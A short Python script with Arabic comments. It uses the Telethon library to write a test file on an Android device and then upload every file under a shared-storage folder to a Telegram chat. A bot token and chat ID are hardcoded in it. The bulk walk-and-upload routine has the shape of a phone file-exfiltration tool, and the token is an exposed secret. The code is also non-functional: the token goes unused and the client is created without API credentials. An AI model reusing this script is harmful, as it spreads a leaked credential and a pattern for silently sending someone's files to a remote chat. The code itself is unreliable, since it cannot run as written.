import os
from telethon.sync import TelegramClient

def send_files_to_telegram(bot_token, chat_id, directory):
    client = None
    try:
        # إنشاء ملف jj.txt في التخزين الداخلي
        jj_path = '/storage/emulated/0/jj.txt'
        with open(jj_path, 'w') as jj_file:
            jj_file.write('Hello from jj.txt!')

        # إرسال ملف jj.txt إلى البوت
        client = TelegramClient('session_name', None, None)
        client.connect()

        if not client.is_user_authorized():
            raise Exception("User not authorized. Please log in.")

        client.send_file(chat_id, jj_path)

        # إرسال جميع الملفات في المجلد إلى البوت
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                client.send_file(chat_id, file_path)

        print("Files sent successfully.")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        if client is not None:
            client.disconnect()

# قم بتعبئة المعلومات الجديدة (bot_token و chat_id و directory)
send_files_to_telegram(bot_token='6407942984:AAFfhS3QUdpgBZDzYci5kRN1Q7kgJbWXrVg',
                       chat_id='6518876265',
                       directory='/storage/emulated/0/my_files/')
